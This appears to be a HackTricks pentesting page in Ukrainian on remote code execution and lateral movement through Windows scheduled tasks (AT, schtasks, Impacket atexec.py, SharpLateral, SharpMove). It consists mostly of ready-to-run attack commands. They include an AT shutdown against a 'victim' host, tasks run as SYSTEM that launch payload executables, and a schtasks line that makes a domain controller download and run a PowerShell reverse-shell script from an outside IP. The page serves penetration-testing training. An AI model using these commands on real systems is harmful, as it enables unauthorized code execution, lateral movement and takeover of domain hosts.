# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Як це працює

At дозволяє планувати завдання на хостах, де вам відомі username/(password/Hash). Тож ви можете використовувати його для виконання команд на інших хостах і отримання результату.
```
At \\victim 11:00:00PM shutdown -r
```
За допомогою schtasks спочатку потрібно створити завдання, а потім викликати його:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Ви можете використовувати **`atexec.py` з Impacket**, щоб виконувати команди у віддалених системах за допомогою команди AT. Для цього потрібні дійсні облікові дані (ім’я користувача та пароль або hash) цільової системи.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Ви також можете використовувати [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Ви можете використовувати [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Більше інформації про [**використання schtasks із silver tickets тут**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
